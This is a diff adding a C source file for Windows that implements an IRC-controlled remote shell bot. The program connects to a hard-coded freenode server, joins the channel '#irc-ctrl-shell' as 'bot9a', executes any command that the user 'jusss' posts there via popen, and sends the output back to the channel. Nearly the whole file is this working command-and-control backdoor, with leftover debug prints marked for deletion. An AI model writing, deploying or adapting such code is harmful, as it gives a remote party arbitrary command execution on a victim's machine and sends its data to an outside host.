@@ -1,0 +1,177 @@
+/* gcc irc.c -o irc.exe -lpthread -lwsock32 */
+/* morgan.freenode.net 64.32.24.176 */
+/* holmes.freenode.net 83.170.73.249  6665 */
+
+/* privmsg #ubuntu-cn :im using telnet now! */
+
+/* PING :holmes.freenode.net */
+
+#include <stdio.h>
+#include <malloc.h>
+#include <string.h>
+#include <windows.h>
+#include <stdlib.h>
+#include <winsock.h>
+#pragma comment(lib,"ws2_32.lib")
+#include <pthread.h>
+#pragma comment(lib, "pthreadVC2.lib")
+
+    char *ping = "PING :morgan.freenode.net";
+    char *pong = "PONG :morgan.freenode.net\r\n";
+    char *keyword = "jusss PRIVMSG #irc-ctrl-shell :";
+    SOCKET sockfd;
+
+pthread_i()
+{
+    char recv_cmd[1080]={0};
+    char cmd[1024]={0};
+    char popen_out[1024]={0};
+    char popen_out_send[1080] = {"privmsg #irc-ctrl-shell :"};
+    char *popen_out_send_body_cls = popen_out_send + 25;
+    FILE *popen_fp;
+
+    while ( 1 ) {
+  	recv(sockfd,recv_cmd,1080,0);
+	printf("%s",recv_cmd); /* delete it */ 
+	
+	if (strstr(recv_cmd,ping)) send(sockfd,pong,strlen(pong),0); /* PING PONG */
+
+	/* execute command in shell */
+	if (strstr(recv_cmd,keyword)) {
+	    strcpy(cmd,((strstr(recv_cmd,keyword))+31));
+
+	    popen_fp = popen(cmd,"r");
+
+	    while ( fgets(popen_out,1024,popen_fp) != NULL) {
+
+		strcat(popen_out_send,popen_out);
+		send(sockfd,popen_out_send,strlen(popen_out_send),0);
+		memset(popen_out,0,1024);
+		memset(popen_out_send_body_cls,0,1055);
+		/*	    Sleep(1000);  irc server don't allow flood */
+	    }
+	    
+	    pclose(popen_fp);
+	    memset(cmd,0,1024);
+	}
+	memset(recv_cmd,0,1080);
+    }
+}
+
+pthread_ii()
+{
+    char recv_cmd[1080]={0};
+    char cmd[1024]={0};
+    char popen_out[1024]={0};
+    char popen_out_send[1080] = {"privmsg #irc-ctrl-shell :"};
+    char *popen_out_send_body_cls = popen_out_send + 25;
+    FILE *popen_fp;
+
+    while ( 1 ) {
+  	recv(sockfd,recv_cmd,1080,0);
+	printf("%s",recv_cmd); /* delete it */ 
+	
+	if (strstr(recv_cmd,ping)) send(sockfd,pong,strlen(pong),0); /* PING PONG */
+
+	/* execute command in shell */
+	if (strstr(recv_cmd,keyword)) {
+	    strcpy(cmd,((strstr(recv_cmd,keyword))+31));
+
+	    popen_fp = popen(cmd,"r");
+
+	    while ( fgets(popen_out,1024,popen_fp) != NULL) {
+
+		strcat(popen_out_send,popen_out);
+		send(sockfd,popen_out_send,strlen(popen_out_send),0);
+		memset(popen_out,0,1024);
+		memset(popen_out_send_body_cls,0,1055);
+		/*	    Sleep(1000);  irc server don't allow flood */
+	    }
+	    
+	    pclose(popen_fp);
+	    memset(cmd,0,1024);
+	}
+	memset(recv_cmd,0,1080);
+    }
+}
+
+
+int main()
+{
+    char *nick = "NICK bot9a\r\n";
+    char *user = "USER bot9a 8 * :bot9a\r\n";
+    char *channel = "join #irc-ctrl-shell\r\n";
+    char *recv_serv_profile;
+    int  recv_length = 0,print_connect_count = 1;
+    pthread_t pid_i,pid_ii;
+    struct sockaddr_in irc_addr;
+    irc_addr.sin_family=AF_INET;
+    irc_addr.sin_addr.s_addr=inet_addr("64.32.24.176");
+    irc_addr.sin_port=htons(6665);
+    WSADATA wsaData;
+
+    recv_serv_profile = malloc(8192);
+    memset(recv_serv_profile,0,8192);
+    WSAStartup(MAKEWORD(2,2),&wsaData);
+    sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+
+    connect(sockfd,(struct sockaddr*)&irc_addr,sizeof(irc_addr));
+
+    /* test if it has connected the server */
+    while ( 1 ) {
+      memset(recv_serv_profile,0,8192);
+      recv_length = recv(sockfd,recv_serv_profile,8192,0);
+
+      if (recv_length > 0) while (print_connect_count) {
+	  printf("connecting...\r\n");
+	  print_connect_count = print_connect_count - print_connect_count;
+	}
+
+      else { printf("connect failed...\r\n"); goto end;}
+
+      printf("%s",recv_serv_profile); /* delete me */
+
+      if ( strstr(recv_serv_profile,"NOTICE * :*** No Ident response") ) {
+	printf("already connected the server\r\n");
+	break;
+      }
+    }
+
+    send(sockfd,nick,strlen(nick),0);
+    send(sockfd,user,strlen(user),0);
+
+    /* test if it has received all message of the server */
+    while ( 1 ) {
+      memset(recv_serv_profile,0,8192);
+      recv(sockfd,recv_serv_profile,8192,0);
+      printf("%s",recv_serv_profile); /* delete me */
+      if (strstr(recv_serv_profile,":End of /MOTD command.")) break;
+    }
+
+    send(sockfd,channel,strlen(channel),0);
+
+    /* test if it has joined the channel */
+   while ( 1 ) {
+      memset(recv_serv_profile,0,8192);
+      recv(sockfd,recv_serv_profile,8192,0);
+      printf("%s",recv_serv_profile); /* delete me */
+      if (strstr(recv_serv_profile,"#irc-ctrl-shell :End of /NAMES list.")) {
+	printf("already joined the channel\r\n");
+	break;
+      }
+    }
+
+    pthread_create(&pid_i,NULL,(void *)&pthread_i,NULL);
+    pthread_create(&pid_ii,NULL,(void *)&pthread_ii,NULL);
+    pthread_join(pid_i,NULL);
+    pthread_join(pid_ii,NULL);
+
+    closesocket(sockfd);
+    WSACleanup();
+
+ end:
+    printf("press any key to exit");
+    getch();
+    return 0;   
+
+}
